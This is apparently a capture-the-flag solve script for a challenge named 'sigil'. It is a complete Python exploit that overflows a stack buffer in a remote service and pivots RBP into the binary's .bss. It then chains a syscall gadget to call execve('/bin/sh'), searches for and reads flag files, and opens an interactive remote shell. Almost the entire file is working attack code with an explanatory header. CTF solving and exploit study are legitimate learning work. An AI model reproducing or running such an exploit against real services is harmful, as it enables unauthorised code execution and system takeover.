#!/usr/bin/env python3
# sigil - solve_nopwn.py
# Same exploit as solve.py, but uses only the standard library (socket),
# so you don't need pwntools / unicorn / cmake at all.
#
# Bug: listen() reads 0x400 bytes into a 0x40-byte stack buffer, no canary.
# Technique: sys3(nr,a,b,c) reloads its 4 args from [rbp-0x18/0x20/0x28/0x30]
# right before `syscall`, so controlling RBP gives us an arbitrary 3-arg
# syscall with no ASLR dependency (we stage through the binary's own fixed
# .bss address, since it's non-PIE/static).
#
# Stage 1: smash RBP -> 0x404040 (bss) and RET -> 0x401068 (mid-listen,
#          which does lea rax,[rbp-0x40]; ...; call sys3) => triggers a
#          2nd read(0, 0x404000, 0x400): lands at a fixed known address.
# Stage 2: data at 0x404000 makes the fall-through land on 0x401014
#          (sys3's reload-then-syscall gadget) with rax=59 (execve),
#          rdi=&"/bin/sh", rsi=0, rdx=0 => shell.

import socket
import struct
import sys
import time
import select

HOST = "w01.ctf.chronos-security.ro"
PORT = 39024

p64 = lambda x: struct.pack('<Q', x)

BSS                = 0x404000
SYS3_LOAD_SYSCALL  = 0x401014
LISTEN_READ_GADGET = 0x401068

stage1 = b'A' * 0x40
stage1 += p64(BSS + 0x40)           # new RBP
stage1 += p64(LISTEN_READ_GADGET)   # new RET

stage2 = bytearray(0xA0)
stage2[0x40:0x48] = p64(BSS + 0x80)
stage2[0x48:0x50] = p64(SYS3_LOAD_SYSCALL)
stage2[0x50:0x58] = p64(0)
stage2[0x58:0x60] = p64(0)
stage2[0x60:0x68] = p64(BSS + 0x90)
stage2[0x68:0x70] = p64(59)
stage2[0x90:0x98] = b"/bin/sh\x00"
stage2 = bytes(stage2)

s = socket.create_connection((HOST, PORT), timeout=10)

def recv_some(timeout=1.0):
    data = b''
    end = time.time() + timeout
    s.setblocking(False)
    try:
        while time.time() < end:
            r, _, _ = select.select([s], [], [], 0.2)
            if r:
                try:
                    chunk = s.recv(4096)
                except BlockingIOError:
                    continue
                if not chunk:
                    break
                data += chunk
            elif data:
                break
    finally:
        s.setblocking(True)
    return data

banner = recv_some()
sys.stdout.buffer.write(banner)
sys.stdout.flush()

s.sendall(stage1)
time.sleep(0.3)
s.sendall(stage2)
time.sleep(0.3)

out = recv_some()
sys.stdout.buffer.write(out)
sys.stdout.flush()

# try to grab the flag automatically
s.sendall(b'cat flag* 2>/dev/null || cat /flag* 2>/dev/null || find / -iname "*flag*" 2>/dev/null\n')
time.sleep(1.0)
out = recv_some()
sys.stdout.buffer.write(out)
sys.stdout.flush()

print("\n[*] Dropping into interactive mode. Type commands, Ctrl-C to quit.")

# simple interactive loop
s.setblocking(True)
import threading

def reader():
    while True:
        try:
            chunk = s.recv(4096)
        except OSError:
            break
        if not chunk:
            break
        sys.stdout.buffer.write(chunk)
        sys.stdout.flush()

t = threading.Thread(target=reader, daemon=True)
t.start()

try:
    for line in sys.stdin:
        s.sendall(line.encode())
except KeyboardInterrupt:
    pass
finally:
    s.close()
